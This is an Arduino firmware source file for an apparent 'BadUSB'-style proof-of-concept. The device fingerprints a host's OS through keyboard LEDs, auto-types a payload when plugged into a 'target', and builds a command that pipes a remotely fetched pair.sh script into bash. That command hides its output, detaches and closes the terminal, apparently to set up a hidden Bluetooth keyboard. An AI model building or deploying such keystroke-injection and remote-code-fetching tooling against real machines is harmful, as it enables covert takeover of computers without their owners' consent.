// USB-HID -> BLE-HID pairing-bootstrap PoC. One codebase, two boards (build flags).
// Start MENU picks the target OS (or Autodetect). Single button:
//   CLICK = next item, HOLD = select.
//   Autodetect -> LED-fingerprint the host, then run that OS's payload.
//   Linux / Windows / macOS -> force that OS's payload (skips detection).
// On the T-Embed the payload is TYPED over USB HID; on the C5 (no USB-OTG) the
// Linux command is shown on screen to run manually. Typing text + device
// management is on the phone web page.
#include <Arduino.h>
#include "usb_hid.h"
#include "ble_hid.h"
#include "display.h"
#include "netota.h"
#include <Wire.h>

#if defined(POC_BOARD_TEMBED)
#define POC_BOARD_NAME "T-Embed CC1101"
#else
#define POC_BOARD_NAME "Waveshare C5"
#endif

#if defined(POC_BOARD_TEMBED)
static const int BTN = 0;    // encoder push (also BOOT)
#else
static const int BTN = 28;   // Waveshare BOOT
#endif

static bool     lastBtn = HIGH;
static uint32_t pressStart = 0;
static bool     firedLong = false;
static int      sel = 0;
static uint32_t menuAt = 0;   // T-Embed: >0 = auto-return to the menu at this millis() after a send

static const char* ITEMS[] = { "Autodetect", "Linux", "Windows", "macOS" };
static const int   NITEMS = 4;
static const int   OS_OF[] = { POC_OS_UNKNOWN, POC_OS_LINUX, POC_OS_WINDOWS, POC_OS_MACOS };

#ifdef POC_HAS_USB_HID
extern "C" bool tud_mounted(void);
static bool usbHost() { return tud_mounted(); }     // a USB host has enumerated us
#else
static bool usbHost() { return false; }
#endif
#if defined(POC_HAS_USB_HID) && defined(POC_AUTORUN)
static bool armed = false; static int armedIdx = 0; static bool wasMounted = false;
#endif

// Battery %: BQ27220 fuel gauge over I2C (T-Embed only), cached ~10s. -1 = none.
#if defined(POC_BOARD_TEMBED)
static int batteryPct() {
    static int cached = -1; static uint32_t last = 0; static bool probed = false, present = false;
    if (probed && millis() - last < 10000) return cached;
    last = millis();
    if (!probed) { probed = true; Wire.begin(8, 18); Wire.beginTransmission(0x55); present = (Wire.endTransmission() == 0); }
    if (!present) { cached = -1; return cached; }
    Wire.beginTransmission(0x55); Wire.write(0x2C);              // StateOfCharge (%)
    if (Wire.endTransmission(false) != 0) { cached = -1; return cached; }
    if (Wire.requestFrom(0x55, 2) != 2)   { cached = -1; return cached; }
    uint8_t lo = Wire.read(), hi = Wire.read(); uint16_t soc = lo | (hi << 8);
    cached = (soc <= 100) ? (int)soc : -1;
    return cached;
}
#else
static int batteryPct() { return -1; }
#endif

static void statusBar() { dispBle(bleHidConnected(), bleHidPhone(), usbHost(), batteryPct(), bleHidConnCount()); }

static void drawMenu() {
    char body[200]; int p = 0;
#if defined(POC_BOARD_TEMBED)
    p += snprintf(body + p, sizeof(body) - p, "click=next hold=go\n\n");
#else
    p += snprintf(body + p, sizeof(body) - p, "click=next hold=go\n\n");
#endif
    for (int i = 0; i < NITEMS; i++)
        p += snprintf(body + p, sizeof(body) - p, "%s%s\n", i == sel ? "> " : "  ", ITEMS[i]);
    dispShow("SELECT OS", body, 0x22D3E0);
    statusBar();
}

static void buildPairCmd(char* out, size_t n) {
    snprintf(out, n,
        "nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s %s'"
        " >/dev/null 2>&1 & disown; exit", bleHidMac());
}

// Actually deliver the payload for the chosen menu item.
static void fireOS(int menuIdx) {
    int os = OS_OF[menuIdx];
#ifdef POC_HAS_USB_HID
    if (menuIdx == 0) {   // Autodetect
        dispShow("DETECTING", "LED fingerprint...", 0xF7C948); statusBar();
        os = usbDetectOS();
    }
    char h[40]; snprintf(h, sizeof(h), "%s", (menuIdx == 0) ? usbOsName(os) : ITEMS[menuIdx]);
    dispShow(h, "typing the pairing\npayload...", 0xF7C948); statusBar();
    usbSamplePayload(os);
    dispShow("SENT", "payload typed.\nclick = menu", 0x3FB950); statusBar();
    menuAt = millis() + 4000;   // auto-return to the menu after a few seconds
#else
    // C5: no USB typing. Only the Linux helper exists; show it, else a note.
    if (os == POC_OS_LINUX || menuIdx == 0) {
        char cmd[420]; buildPairCmd(cmd, sizeof(cmd));
        dispCmd("RUN ON PC (Linux):", cmd); statusBar();
    } else {
        dispShow(ITEMS[menuIdx], "no helper for this\nOS yet (Linux only)", 0xF7C948); statusBar();
    }
#endif
}

// Select the highlighted item. Manual (default): fire now. Autorun: arm + wait.
static void selectOS(int menuIdx) {
#if defined(POC_HAS_USB_HID) && defined(POC_AUTORUN)
    armed = true; armedIdx = menuIdx; wasMounted = tud_mounted();
    char b[64]; snprintf(b, sizeof(b), "armed: %s\nplug into target\nto auto-fire", ITEMS[menuIdx]);
    dispShow("ARMED", b, 0xF7C948); statusBar();
#else
    fireOS(menuIdx);
#endif
}

void setup() {
    pinMode(BTN, INPUT_PULLUP);
#if defined(POC_BOARD_TEMBED)
    pinMode(15, OUTPUT); digitalWrite(15, HIGH);   // BOARD_PWR_EN: power the display rail
#endif
    Serial.begin(115200);
    dispBegin();
    { char sp[64]; snprintf(sp, sizeof(sp), "v%s\n%s", netVersion(), POC_BOARD_NAME);
      dispShow("PoC-KBD", sp, 0x22D3E0); }                       // boot splash w/ version
    usbHidBegin();
    bleHidBegin();
    netBegin();                         // reconnect WiFi if creds were saved (for OTA)
    delay(1200);                        // keep the splash up briefly
    drawMenu();
    Serial.printf("[poc] ready v%s. BLE MAC = %s\n", netVersion(), bleHidMac());
}

void loop() {
    bleHidTick();

    bool b = digitalRead(BTN);
    if (b == LOW && lastBtn == HIGH) { pressStart = millis(); firedLong = false; }
    if (b == LOW && !firedLong && millis() - pressStart > 800) { firedLong = true; selectOS(sel); }  // HOLD = select
    if (b == HIGH && lastBtn == LOW) {                                                                // release
        uint32_t held = millis() - pressStart;
        if (!firedLong && held > 40 && held < 700) {                                                  // CLICK
            if (menuAt) { menuAt = 0; drawMenu(); }                    // post-send: click = back to menu
            else { sel = (sel + 1) % NITEMS; drawMenu(); }            // in menu: click = next item
        }
    }
    lastBtn = b;

    if (menuAt && (int32_t)(millis() - menuAt) >= 0) { menuAt = 0; drawMenu(); }   // auto-return to menu

#if defined(POC_HAS_USB_HID) && defined(POC_AUTORUN)
    if (armed) {                                   // fire on a fresh plug into a host
        bool m = tud_mounted();
        if (m && !wasMounted) { armed = false; fireOS(armedIdx); }
        wasMounted = m;
    }
#endif

    static uint32_t t = 0;
    if (millis() - t > 800) { t = millis();
        statusBar();
        Serial.printf("[poc] pc=%s phone=%s conns=%d\n", bleHidConnected() ? "on" : "off", bleHidPhone() ? "on" : "off", bleHidConnCount());
    }
    delay(10);
}
